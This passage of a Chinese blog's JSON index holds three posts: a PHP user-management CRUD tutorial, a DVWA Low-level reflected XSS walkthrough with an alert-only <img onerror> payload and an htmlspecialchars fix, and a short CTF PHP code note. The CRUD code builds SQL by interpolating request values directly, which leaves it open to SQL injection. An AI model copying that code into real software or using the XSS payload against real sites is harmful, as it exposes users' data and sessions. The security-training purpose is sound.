$Id;?&gt;\" method=\"post\"&gt; &lt;!-- act页面实现的修改功能，这里只需要传入要修改的Id值就可以更改此Id中对应的数据 --&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;新用户名:&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" name=\"Name\" value=&lt;?php echo \"&#123;$row['Name']&#125;\";//把查询到的数据的Name返回到输入框中，这样子我们就可以实现修改功能 ?&gt; &gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;新密码:&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" name=\"Pwd\" value= &lt;?php echo \"&#123;$row['Pwd']&#125;\"; //同上?&gt; &gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;input type=\"submit\" class=\"btn btn-primary\"&gt; &lt;input type=\"reset\" class=\"btn btn-danger\"&gt; &lt;/div&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 插入数据代码：1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;add&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;script type=\"text/javascript\" src=\"bower_components/jquery/dist/jquery.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"bower_components/bootstrap/dist/js/bootstrap.min.js\"&gt;&lt;/script&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"bower_components/bootstrap/dist/css/bootstrap.min.css\"&gt;&lt;body&gt; &lt;div class=\"container\"&gt; &lt;h1 class=\"page-header\"&gt; &lt;a href=\"index.php\" class=\"btn btn-warning\"&gt;查看用户&lt;/a&gt; &lt;a href=\"\" class=\"btn btn-primary\"&gt;添加用户&lt;/a&gt; &lt;/h1&gt; &lt;form action=\"act.php?act=insert\" method=\"post\"&gt; &lt;!-- act.php页面实现了插入功能，所以这里我们只需要把内容提交到act.php就可以完成插入内容 --&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;用户名:&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" name=\"Name\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;密码:&lt;/label&gt; &lt;input type=\"text\" class=\"form-control\" name=\"Pwd\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;input type=\"submit\" class=\"btn btn-primary\"&gt; &lt;input type=\"reset\" class=\"btn btn-danger\"&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 删除功能代码:删除页面代码也在首页(index.php)里实现的一般我们删除操作是需要十分谨慎的，因为数据一旦删除是无法恢复的，那么如果用户不小心点到了按钮，我们就应该提醒他是否要删除。 可以看到这里有一个class是delete，然后看到下面有一段提醒是否执行删除的JS代码： 最后我们看看act.php的代码：1234567891011121314151617181920212223242526272829303132333435363738&lt;?php include 'config.inc.php'; //包含PDO链接数据库代码 $act = $_GET[\"act\"]; //获取GET请求过来的act值，来实现增、删、改。 if($act == 'delete')&#123; //如果是选择删除 $Id = $_GET[\"Id\"]; //获取GET请求过来的ID $sql = \"delete from t1 where Id=?\"; //这是SQL语句的删除 $smt = $pdo-&gt;prepare($sql); //给SQL语句做标记 $smt-&gt;bindValue(1,$Id); //绑定一个值到用作预处理的 SQL 语句中的对应命名占位符或问号占位符 if($smt-&gt;execute())&#123; //判断是否执行成功，如果执行成功返回的是1 echo \"&lt;script&gt;location='index.php'&lt;/script&gt;\"; //执行成功就跳转到首页(index.php) &#125; &#125; if($act == 'insert')&#123; //如果是选择插入 $Name = $_POST[\"Name\"]; //获取POST请求的Name值 $Pwd = $_POST[\"Pwd\"]; //获取POST请求的Pwd值 $sql = \"insert into t1(Name,Pwd) values('&#123;$Name&#125;','&#123;$Pwd&#125;')\"; //这是SQL语句的插入 $smt = $pdo-&gt;prepare($sql); //给SQL语句做标记 if($smt-&gt;execute())&#123; //判断是否执行成功 echo \"&lt;script&gt;location='index.php'&lt;/script&gt;\"; //执行成功就跳转到首页(index.php) &#125;&#125; /*如果act=update和id=x，那么就执行修改的SQL语句，修改条件(where)是Id=x*/ if($act == 'update')&#123; //如果是更改 $Id = $_GET[\"Id\"]; //获取GET请求的Id值 $Name = $_POST[\"Name\"]; //获取POST的Name值 $Pwd = $_POST[\"Pwd\"]; //获取POST请求的Pwd值 $sql = \"update t1 set Name='&#123;$Name&#125;',Pwd='&#123;$Pwd&#125;' where Id=&#123;$Id&#125;\"; //这是SQL语句的更改 $smt = $pdo-&gt;prepare($sql); //给SQL语句做标记 if($smt-&gt;execute())&#123; //判断是否执行成功 echo \"&lt;script&gt;location='index.php'&lt;/script&gt;\"; //如果执行成功就跳转到首页(index.php) &#125; &#125; ?&gt; 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"编程","slug":"编程","permalink":"127.0.0.1/categories/编程/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"127.0.0.1/tags/PHP/"}]},{"title":"基于DVWA的反射型Xss测试平台Low等级讲解","slug":"基于DVWA的Xss测试平台Low等级讲解","date":"2018-05-24T09:34:46.000Z","updated":"2018-05-25T14:04:40.000Z","comments":true,"path":"2018/05/24/基于DVWA的Xss测试平台Low等级讲解/","link":"","permalink":"127.0.0.1/2018/05/24/基于DVWA的Xss测试平台Low等级讲解/","excerpt":"Dvwa是一个网站渗透测试演练平台，里面包括了Xss攻击,Sql注入攻击，Csrf漏洞、文件上传漏洞、命令注入漏洞等，而且每个漏洞都分为Low(低等级)、Medium( 中等级 )、High( 高等级 )、Impossible( 没漏洞等级 )","text":"Dvwa是一个网站渗透测试演练平台，里面包括了Xss攻击,Sql注入攻击，Csrf漏洞、文件上传漏洞、命令注入漏洞等，而且每个漏洞都分为Low(低等级)、Medium( 中等级 )、High( 高等级 )、Impossible( 没漏洞等级 ) 下载过程和安装过程网上可以找到我就不讲解了。 首先将Dvwa等级设置成Low: 开始Xss漏洞讲解Xss反射型：当输入hello在输入框点击Submit后，会输出一个Hello iamfree，那么我们来看看这是如何实现的 实现的代码：因为这是Low级别的，所以我们可以清楚的看见这里没有做任何过滤，我们只需要输入一串而已的Js代码就可以实现盗取别人Cookie，做钓鱼之类的功能，下面我来简单的演示一下~ 输入&lt;img src=x onerror=alert(&#39;iamfree&#39;)&gt;后，Url变成http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27iamfree%27%29%3E#，效果: &lt;img src=x onerror=alert(&#39;iamfree&#39;)&gt;的src表示img图片的地址，可以是本地也可以是Url形式;onerror的意思是如果图片没有正常显示的话就会执行=后面的代码，因为这里src=x而x是不存在的，所以无法显示，就会报错了~ 如何防御这里的话防御很简单的，只需要一个函数即可： 防御代码:12345678910111213&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user // 防御的反射Xss $name = htmlspecialchars($_GET['name']); $html .= '&lt;pre&gt;Hello ' . $name . '&lt;/pre&gt;';&#125;?&gt; 继续访问刚才的Url(http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27iamfree%27%29%3E#)，看看是否有效:成功的防止了Xss反射型攻击了~ htmlspecialchars函数的官方解释: 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"127.0.0.1/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"127.0.0.1/tags/PHP/"},{"name":"Dvwa","slug":"Dvwa","permalink":"127.0.0.1/tags/Dvwa/"},{"name":"渗透测试","slug":"渗透测试","permalink":"127.0.0.1/tags/渗透测试/"},{"name":"Xss","slug":"Xss","permalink":"127.0.0.1/tags/Xss/"}]},{"title":"某CTF赛的一处代码简单讲解","slug":"某CTF赛的一处代码简单讲解","date":"2018-05-24T08:07:33.000Z","updated":"2018-06-06T10:13:53.449Z","comments":true,"path":"2018/05/24/某CTF赛的一处代码简单讲解/","link":"","permalink":"127.0.0.1/2018/05/24/某CTF赛的一处代码简单讲解/","excerpt":"此篇文章只是给里面的代码处做一下详细的讲解~原文地址:loudong.360.cn/School/content/id/285","text":"此篇文章只是给里面的代码处做一下详细的讲解~原文地址:loudong.360.cn/School/content/id/285 CTF线下赛中一处代码( 红色区域处 )，现在就是来讲解这个的~ 讲解开始:首先看一下我写的这个代码:123456789101112131415function e( $str )&#123; if ( is_array( $str ) )&#123; //如果是列表~ echo \"&lt;pre&gt;\"; var_dump( $str ); &#125;else &#123; echo $str ; &#125;&#125;$mylist = [ 'ctrl' =&gt; ( !empty($_GET['p']) ? $_GET['p'] : 'blog' ) , //ctrl的value值：如果get请求的p值不为空，那么就返回get请求的p值，否者返回blog 'template' =&gt; ( !empty($_GET['t']) ? $_GET['t'] : 'pc' ) //template的value值：如果get请求的t值不为空，那么就返回get请求的t值，否者返回pc\\];e( $mylist ); 这里的!empty($_GET[&#39;p&#39;]) ? $_GET[&#39;p&#39;] : &#39;blog&#39;是三元表达式，详细用法我也在代码处讲解过了 实验一下代码功能：如果没有添加任何值的话，默认的就是ctrl的值为blog,template的值为pc 我们传递一下GET请求的p值和GET请求的t值: 如果你们觉得这篇文章有点水的话… 那也确实是，哈哈哈(太基础)，但是我只是想来做一篇文章来摆设摆设~ 十年寒窗无人问，一举成名天下知 – Cai_Team","categories":[{"name":"Web攻防","slug":"Web攻防","permalink":"127.0.0.1/categories/Web攻防/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"127.0.0.1/tags/CTF/"},{"name":"代码审计","slug":"代码审计","permalink":"127.0.0.1/tags/代码审计/"},{"name":"PHP","slug":"PHP","permalink":"127.0.0.1/tags/PHP/"}]}]}